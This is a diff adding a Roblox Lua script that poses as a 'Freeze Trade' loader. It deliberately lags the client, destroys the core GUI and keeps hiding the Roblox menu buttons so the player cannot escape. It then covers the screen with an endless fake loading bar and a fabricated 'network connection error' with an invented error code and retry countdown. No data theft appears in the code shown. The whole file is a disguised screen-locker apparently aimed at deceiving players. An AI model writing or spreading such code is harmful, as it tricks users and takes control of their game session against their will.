@@ -1,0 +1,554 @@
+local function fakeLag(seconds)
+    local start = tick()
+    while tick() - start < seconds do end
+end
+
+fakeLag(3)  -- lag 3 giây
+task.wait(1)
+fakeLag(2)  -- lag 2 giây
+task.wait(1)
+fakeLag(3)  -- lag 3 giây
+task.wait(1)
+fakeLag(4)
+task.wait(0.5)
+fakeLag(4)
+task.wait(1)
+fakeLag(2)
+task.wait(0.1)
+for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    v:Destroy()
+end
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+
+-- ═══════════════════════════════════
+-- DESTROY CORE GUI
+-- ═══════════════════════════════════
+pcall(function()
+    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+end)
+
+pcall(function()
+    for _, v in ipairs(CoreGui:GetDescendants()) do
+        if v.Name == "TopBarApp" or v.Name == "MenuButton"
+        or v.Name == "Unibar" or v.Name == "TopBar" then
+            pcall(function() v.Visible = false end)
+        end
+    end
+end)
+
+-- ═══════════════════════════════════
+-- SCREENGUI
+-- ═══════════════════════════════════
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LoadingScreen"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.DisplayOrder = 2147483647
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = CoreGui
+
+local Blocker = Instance.new("Frame")
+Blocker.Size = UDim2.new(1, 0, 1, 0)
+Blocker.BackgroundTransparency = 1
+Blocker.BorderSizePixel = 0
+Blocker.ZIndex = 100
+Blocker.Parent = ScreenGui
+
+-- ═══════════════════════════════════
+-- BACKGROUND
+-- ═══════════════════════════════════
+local BG = Instance.new("Frame")
+BG.Size = UDim2.new(1, 0, 1, 0)
+BG.BackgroundColor3 = Color3.fromRGB(5, 10, 15)
+BG.BorderSizePixel = 0
+BG.ZIndex = 1
+BG.Parent = ScreenGui
+
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(5, 10, 15)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 20, 30)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 10, 15)),
+})
+UIGradient.Rotation = 135
+UIGradient.Parent = BG
+
+-- ═══════════════════════════════════
+-- CORNERS
+-- ═══════════════════════════════════
+local function makeCorner(xAnchor, yAnchor, xPos, yPos)
+    local corner = Instance.new("Frame")
+    corner.Size = UDim2.new(0, 60, 0, 60)
+    corner.AnchorPoint = Vector2.new(xAnchor, yAnchor)
+    corner.Position = UDim2.new(xPos, 0, yPos, 0)
+    corner.BackgroundTransparency = 1
+    corner.BorderSizePixel = 0
+    corner.ZIndex = 2
+    corner.Parent = BG
+
+    local lineH = Instance.new("Frame")
+    lineH.Size = UDim2.new(1, 0, 0, 2)
+    lineH.BackgroundColor3 = Color3.fromRGB(0, 255, 231)
+    lineH.BorderSizePixel = 0
+    lineH.BackgroundTransparency = 0.5
+    lineH.ZIndex = 2
+    if yAnchor == 1 then
+        lineH.AnchorPoint = Vector2.new(0, 1)
+        lineH.Position = UDim2.new(0, 0, 1, 0)
+    end
+    lineH.Parent = corner
+
+    local lineV = Instance.new("Frame")
+    lineV.Size = UDim2.new(0, 2, 1, 0)
+    lineV.BackgroundColor3 = Color3.fromRGB(0, 255, 231)
+    lineV.BorderSizePixel = 0
+    lineV.BackgroundTransparency = 0.5
+    lineV.ZIndex = 2
+    if xAnchor == 1 then
+        lineV.AnchorPoint = Vector2.new(1, 0)
+        lineV.Position = UDim2.new(1, 0, 0, 0)
+    end
+    lineV.Parent = corner
+end
+
+makeCorner(0, 0, 0.02, 0.03)
+makeCorner(1, 0, 0.98, 0.03)
+makeCorner(0, 1, 0.02, 0.97)
+makeCorner(1, 1, 0.98, 0.97)
+
+-- ═══════════════════════════════════
+-- TITLE
+-- ═══════════════════════════════════
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0.6, 0, 0.1, 0)
+Title.AnchorPoint = Vector2.new(0.5, 0)
+Title.Position = UDim2.new(0.5, 0, 0.16, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Freeze Trade Loading.."
+Title.TextColor3 = Color3.fromRGB(0, 255, 231)
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.ZIndex = 2
+Title.Parent = BG
+
+-- ═══════════════════════════════════
+-- PERCENT
+-- ═══════════════════════════════════
+local PercentLabel = Instance.new("TextLabel")
+PercentLabel.Size = UDim2.new(0.35, 0, 0.22, 0)
+PercentLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+PercentLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+PercentLabel.BackgroundTransparency = 1
+PercentLabel.Text = "0%"
+PercentLabel.TextColor3 = Color3.fromRGB(0, 255, 231)
+PercentLabel.TextTransparency = 0.1
+PercentLabel.TextScaled = true
+PercentLabel.Font = Enum.Font.GothamBold
+PercentLabel.ZIndex = 2
+PercentLabel.Parent = BG
+
+local Stroke = Instance.new("UIStroke")
+Stroke.Color = Color3.fromRGB(0, 255, 231)
+Stroke.Thickness = 1.5
+Stroke.Transparency = 0.4
+Stroke.Parent = PercentLabel
+
+-- ═══════════════════════════════════
+-- PROGRESS BAR
+-- ═══════════════════════════════════
+local BarTrack = Instance.new("Frame")
+BarTrack.Size = UDim2.new(0.65, 0, 0, 14)
+BarTrack.AnchorPoint = Vector2.new(0.5, 0.5)
+BarTrack.Position = UDim2.new(0.5, 0, 0.66, 0)
+BarTrack.BackgroundColor3 = Color3.fromRGB(0, 30, 25)
+BarTrack.BorderSizePixel = 0
+BarTrack.ZIndex = 2
+BarTrack.Parent = BG
+Instance.new("UICorner", BarTrack).CornerRadius = UDim.new(1, 0)
+local UIStrokeTrack = Instance.new("UIStroke", BarTrack)
+UIStrokeTrack.Color = Color3.fromRGB(0, 255, 231)
+UIStrokeTrack.Thickness = 1
+UIStrokeTrack.Transparency = 0.7
+
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 231)
+BarFill.BorderSizePixel = 0
+BarFill.ZIndex = 2
+BarFill.Parent = BarTrack
+Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1, 0)
+
+local FillGradient = Instance.new("UIGradient", BarFill)
+FillGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 180)),
+    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 231)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 255, 250)),
+})
+
+-- ═══════════════════════════════════
+-- LOG
+-- ═══════════════════════════════════
+local LogLabel = Instance.new("TextLabel")
+LogLabel.Size = UDim2.new(0.65, 0, 0.05, 0)
+LogLabel.AnchorPoint = Vector2.new(0.5, 0)
+LogLabel.Position = UDim2.new(0.5, 0, 0.71, 0)
+LogLabel.BackgroundTransparency = 1
+LogLabel.Text = "Đang khởi tạo hệ thống... | Initializing system..."
+LogLabel.TextColor3 = Color3.fromRGB(0, 200, 180)
+LogLabel.TextTransparency = 0.4
+LogLabel.TextScaled = true
+LogLabel.Font = Enum.Font.Code
+LogLabel.ZIndex = 2
+LogLabel.Parent = BG
+
+-- ═══════════════════════════════════
+-- STATUS
+-- ═══════════════════════════════════
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size = UDim2.new(0.65, 0, 0.04, 0)
+StatusLabel.AnchorPoint = Vector2.new(0.5, 0)
+StatusLabel.Position = UDim2.new(0.5, 0, 0.77, 0)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "● ĐANG TẢI HỆ THỐNG  |  LOADING SYSTEM CORE"
+StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 231)
+StatusLabel.TextTransparency = 0.5
+StatusLabel.TextScaled = true
+StatusLabel.Font = Enum.Font.Code
+StatusLabel.ZIndex = 2
+StatusLabel.Parent = BG
+
+-- ═══════════════════════════════════
+-- PING
+-- ═══════════════════════════════════
+local PingLabel = Instance.new("TextLabel")
+PingLabel.Size = UDim2.new(0.3, 0, 0.04, 0)
+PingLabel.AnchorPoint = Vector2.new(1, 1)
+PingLabel.Position = UDim2.new(0.97, 0, 0.97, 0)
+PingLabel.BackgroundTransparency = 1
+PingLabel.Text = "PING: 12ms"
+PingLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
+PingLabel.TextTransparency = 0.4
+PingLabel.TextScaled = true
+PingLabel.Font = Enum.Font.Code
+PingLabel.TextXAlignment = Enum.TextXAlignment.Right
+PingLabel.ZIndex = 2
+PingLabel.Parent = BG
+
+-- ═══════════════════════════════════
+-- HỘP LỖI MẠNG
+-- ═══════════════════════════════════
+local ErrorBox = Instance.new("Frame")
+ErrorBox.Size = UDim2.new(0.52, 0, 0.30, 0)
+ErrorBox.AnchorPoint = Vector2.new(0.5, 0.5)
+ErrorBox.Position = UDim2.new(0.5, 0, 0.5, 0)
+ErrorBox.BackgroundColor3 = Color3.fromRGB(12, 5, 8)
+ErrorBox.BorderSizePixel = 0
+ErrorBox.Visible = false
+ErrorBox.ZIndex = 3
+ErrorBox.Parent = BG
+Instance.new("UICorner", ErrorBox).CornerRadius = UDim.new(0, 8)
+
+local ErrStroke = Instance.new("UIStroke", ErrorBox)
+ErrStroke.Color = Color3.fromRGB(255, 43, 78)
+ErrStroke.Thickness = 2
+ErrStroke.Transparency = 0.2
+
+-- Icon
+local ErrIcon = Instance.new("TextLabel")
+ErrIcon.Size = UDim2.new(1, 0, 0.28, 0)
+ErrIcon.Position = UDim2.new(0, 0, 0.02, 0)
+ErrIcon.BackgroundTransparency = 1
+ErrIcon.Text = "⚠"
+ErrIcon.TextColor3 = Color3.fromRGB(255, 43, 78)
+ErrIcon.TextScaled = true
+ErrIcon.Font = Enum.Font.GothamBold
+ErrIcon.ZIndex = 4
+ErrIcon.Parent = ErrorBox
+
+-- Tiêu đề lỗi (VI + EN)
+local ErrTitle = Instance.new("TextLabel")
+ErrTitle.Size = UDim2.new(0.92, 0, 0.16, 0)
+ErrTitle.AnchorPoint = Vector2.new(0.5, 0)
+ErrTitle.Position = UDim2.new(0.5, 0, 0.31, 0)
+ErrTitle.BackgroundTransparency = 1
+ErrTitle.Text = "LỖI KẾT NỐI MẠNG  |  NETWORK CONNECTION ERROR"
+ErrTitle.TextColor3 = Color3.fromRGB(255, 43, 78)
+ErrTitle.TextScaled = true
+ErrTitle.Font = Enum.Font.GothamBold
+ErrTitle.ZIndex = 4
+ErrTitle.Parent = ErrorBox
+
+-- Sub (VI + EN)
+local ErrSub = Instance.new("TextLabel")
+ErrSub.Size = UDim2.new(0.88, 0, 0.14, 0)
+ErrSub.AnchorPoint = Vector2.new(0.5, 0)
+ErrSub.Position = UDim2.new(0.5, 0, 0.49, 0)
+ErrSub.BackgroundTransparency = 1
+ErrSub.Text = "Mất kết nối đến máy chủ.  |  Lost connection to server."
+ErrSub.TextColor3 = Color3.fromRGB(255, 130, 140)
+ErrSub.TextTransparency = 0.2
+ErrSub.TextScaled = true
+ErrSub.Font = Enum.Font.Code
+ErrSub.ZIndex = 4
+ErrSub.Parent = ErrorBox
+
+-- Thử lại sau (VI + EN)
+local ErrRetry = Instance.new("TextLabel")
+ErrRetry.Size = UDim2.new(0.88, 0, 0.13, 0)
+ErrRetry.AnchorPoint = Vector2.new(0.5, 0)
+ErrRetry.Position = UDim2.new(0.5, 0, 0.64, 0)
+ErrRetry.BackgroundTransparency = 1
+ErrRetry.Text = "Thử lại sau: 30s  |  Retry in: 30s"
+ErrRetry.TextColor3 = Color3.fromRGB(255, 200, 80)
+ErrRetry.TextTransparency = 0.1
+ErrRetry.TextScaled = true
+ErrRetry.Font = Enum.Font.GothamBold
+ErrRetry.ZIndex = 4
+ErrRetry.Parent = ErrorBox
+
+-- Error code
+local ErrCode = Instance.new("TextLabel")
+ErrCode.Size = UDim2.new(0.88, 0, 0.11, 0)
+ErrCode.AnchorPoint = Vector2.new(0.5, 1)
+ErrCode.Position = UDim2.new(0.5, 0, 0.98, 0)
+ErrCode.BackgroundTransparency = 1
+ErrCode.Text = "ERROR CODE: NET_TIMEOUT_0x00FF"
+ErrCode.TextColor3 = Color3.fromRGB(255, 43, 78)
+ErrCode.TextTransparency = 0.5
+ErrCode.TextScaled = true
+ErrCode.Font = Enum.Font.Code
+ErrCode.ZIndex = 4
+ErrCode.Parent = ErrorBox
+
+-- ═══════════════════════════════════
+-- LOOP ẨN NÚT ROBLOX
+-- ═══════════════════════════════════
+task.spawn(function()
+    while ScreenGui.Parent do
+        pcall(function()
+            for _, v in ipairs(CoreGui:GetDescendants()) do
+                if v.Name == "TopBarApp" or v.Name == "MenuButton"
+                or v.Name == "Unibar" or v.Name == "TopBar" then
+                    pcall(function() v.Visible = false end)
+                end
+            end
+        end)
+        task.wait(0.1)
+    end
+end)
+
+-- ═══════════════════════════════════
+-- HÀM RESET VỀ TRẠNG THÁI LOADING
+-- ═══════════════════════════════════
+local function resetToLoading()
+    -- Reset màu về cyan
+    PercentLabel.TextColor3 = Color3.fromRGB(0, 255, 231)
+    PercentLabel.TextTransparency = 0.1
+    Stroke.Color = Color3.fromRGB(0, 255, 231)
+    BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 231)
+    FillGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 180)),
+        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 231)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 255, 250)),
+    })
+    Title.Text = "INITIALIZING"
+    Title.TextColor3 = Color3.fromRGB(0, 255, 231)
+    StatusLabel.Text = "● ĐANG TẢI HỆ THỐNG  |  LOADING SYSTEM CORE"
+    StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 231)
+    LogLabel.TextColor3 = Color3.fromRGB(0, 200, 180)
+    PingLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
+    PingLabel.Text = "PING: 12ms"
+    ErrorBox.Visible = false
+    BarFill.Size = UDim2.new(0, 0, 1, 0)
+    PercentLabel.Text = "0%"
+end
+
+-- ═══════════════════════════════════
+-- HÀM CHẠY LOADING 1 → 99%
+-- ═══════════════════════════════════
+local logs = {
+    [1]  = "Đang khởi tạo hệ thống... | Initializing system...",
+    [10] = "Tải kernel modules... | Loading kernel modules...",
+    [20] = "Kiểm tra bộ nhớ RAM... | Checking RAM memory...",
+    [30] = "Khởi động subsystems... | Starting subsystems...",
+    [40] = "Nạp cấu hình mạng... | Loading network config...",
+    [50] = "Xác thực người dùng... | Authenticating user...",
+    [60] = "Tải tài nguyên đồ họa... | Loading graphics assets...",
+    [70] = "Đồng bộ dữ liệu... | Synchronizing data...",
+    [80] = "Thiết lập kết nối... | Establishing connection...",
+    [90] = "Kiểm tra toàn vẹn file... | Verifying file integrity...",
+    [95] = "Kết nối máy chủ... | Connecting to server...",
+    [97] = "Đang chờ phản hồi... | Waiting for response...",
+    [98] = "Timeout... thử lại lần 1... | Timeout... retry 1...",
+    [99] = "Timeout... thử lại lần 2... | Timeout... retry 2...",
+}
+
+local pingValues = {"12ms","14ms","11ms","18ms","22ms","35ms","67ms","120ms","288ms","999ms","???"}
+
+local function runLoading()
+    local pingIdx = 1
+
+    for i = 1, 99 do
+        PercentLabel.Text = tostring(i) .. "%"
+        TweenService:Create(BarFill, TweenInfo.new(0.12, Enum.EasingStyle.Linear), {
+            Size = UDim2.new(i / 100, 0, 1, 0)
+        }):Play()
+
+        if logs[i] then LogLabel.Text = logs[i] end
+
+        if i >= 80 then
+            pingIdx = math.min(pingIdx + 1, #pingValues)
+            PingLabel.Text = "PING: " .. pingValues[pingIdx]
+            if i >= 95 then
+                PingLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+            elseif i >= 90 then
+                PingLabel.TextColor3 = Color3.fromRGB(255, 180, 0)
+            end
+        end
+
+        local delay
+        if     i < 30  then delay = 0.20 + math.random() * 0.10   -- ~9s
+        elseif i < 60  then delay = 0.25 + math.random() * 0.15   -- ~12s
+        elseif i < 80  then delay = 0.35 + math.random() * 0.15   -- ~10s
+        elseif i < 90  then delay = 0.50 + math.random() * 0.20   -- ~7s
+        elseif i < 95  then delay = 0.70 + math.random() * 0.30   -- ~5s
+        elseif i < 98  then delay = 1.00 + math.random() * 0.40   -- ~4s
+        else               delay = 1.50 + math.random() * 0.50    -- ~4s
+        end
+
+        task.wait(delay)
+    end
+
+    -- ══ 99% - HIỆN LỖI MẠNG ══
+    PercentLabel.TextColor3 = Color3.fromRGB(255, 43, 78)
+    Stroke.Color = Color3.fromRGB(255, 43, 78)
+    BarFill.BackgroundColor3 = Color3.fromRGB(255, 43, 78)
+    FillGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 10, 30)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 80, 100)),
+    })
+    StatusLabel.Text = "⚠  KẾT NỐI THẤT BẠI  |  CONNECTION LOST"
+    StatusLabel.TextColor3 = Color3.fromRGB(255, 43, 78)
+    PingLabel.Text = "PING: LOST"
+    LogLabel.Text = "⚠ Mất kết nối đến máy chủ! | Lost connection to server!"
+    LogLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+
+    -- Flash đỏ
+    local flash = Instance.new("Frame")
+    flash.Size = UDim2.new(1, 0, 1, 0)
+    flash.BackgroundColor3 = Color3.fromRGB(255, 0, 30)
+    flash.BackgroundTransparency = 0.3
+    flash.BorderSizePixel = 0
+    flash.ZIndex = 10
+    flash.Parent = BG
+    TweenService:Create(flash, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+        BackgroundTransparency = 1
+    }):Play()
+    task.wait(0.6)
+    flash:Destroy()
+
+    -- Glitch title
+    task.spawn(function()
+        local chars = {"█","▓","▒","░","0","1","X","Z","#","@","!","?"}
+        for _ = 1, 18 do
+            local g = ""
+            for c in ("INITIALIZING"):gmatch(".") do
+                g ..= math.random() < 0.35 and chars[math.random(#chars)] or c
+            end
+            Title.Text = g
+            task.wait(0.06)
+        end
+        Title.Text = "INITIALIZING"
+        Title.TextColor3 = Color3.fromRGB(255, 43, 78)
+    end)
+
+    task.wait(0.4)
+
+    -- Hiện hộp lỗi
+    ErrorBox.Visible = true
+    ErrorBox.BackgroundTransparency = 1
+    ErrStroke.Transparency = 1
+    TweenService:Create(ErrorBox, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0
+    }):Play()
+    TweenService:Create(ErrStroke, TweenInfo.new(0.4), {Transparency = 0.2}):Play()
+
+    -- Pulse hộp lỗi
+    local pulseRunning = true
+    task.spawn(function()
+        while pulseRunning and ErrorBox.Parent do
+            TweenService:Create(ErrStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.7}):Play()
+            task.wait(0.8)
+            TweenService:Create(ErrStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.1}):Play()
+            task.wait(0.8)
+        end
+    end)
+
+    -- Pulse %
+    local percentPulse = true
+    task.spawn(function()
+        while percentPulse and PercentLabel.Parent do
+            TweenService:Create(PercentLabel, TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 0.65}):Play()
+            task.wait(0.7)
+            TweenService:Create(PercentLabel, TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 0.05}):Play()
+            task.wait(0.7)
+        end
+    end)
+
+    -- ══ ĐẾM NGƯỢC 30 GIÂY ══
+    for countdown = 30, 1, -1 do
+        ErrRetry.Text = "Thử lại sau: " .. countdown .. "s  |  Retry in: " .. countdown .. "s"
+        -- Màu đổi khi gần hết
+        if countdown <= 5 then
+            ErrRetry.TextColor3 = Color3.fromRGB(255, 80, 80)
+        elseif countdown <= 10 then
+            ErrRetry.TextColor3 = Color3.fromRGB(255, 150, 50)
+        end
+        task.wait(1)
+    end
+
+    ErrRetry.Text = "Đang kết nối lại...  |  Reconnecting..."
+    ErrRetry.TextColor3 = Color3.fromRGB(0, 255, 180)
+    ErrCode.Text = "ERROR CODE: NET_TIMEOUT_0x00FF  |  RETRYING..."
+
+    task.wait(1.5)
+
+    -- Dừng pulse
+    pulseRunning = false
+    percentPulse = false
+
+    -- Fade out hộp lỗi
+    TweenService:Create(ErrorBox, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+        BackgroundTransparency = 1
+    }):Play()
+    task.wait(0.6)
+
+    -- Flash trắng chuyển cảnh
+    local flashWhite = Instance.new("Frame")
+    flashWhite.Size = UDim2.new(1, 0, 1, 0)
+    flashWhite.BackgroundColor3 = Color3.fromRGB(0, 255, 231)
+    flashWhite.BackgroundTransparency = 0.5
+    flashWhite.BorderSizePixel = 0
+    flashWhite.ZIndex = 10
+    flashWhite.Parent = BG
+    TweenService:Create(flashWhite, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {
+        BackgroundTransparency = 1
+    }):Play()
+    task.wait(0.7)
+    flashWhite:Destroy()
+
+    -- Reset và chạy lại
+    resetToLoading()
+    task.wait(0.3)
+    runLoading()
+end
+
+-- ═══════════════════════════════════
+-- BẮT ĐẦU
+-- ═══════════════════════════════════
+task.spawn(function()
+    task.wait(1.2)
+    runLoading()
+end)
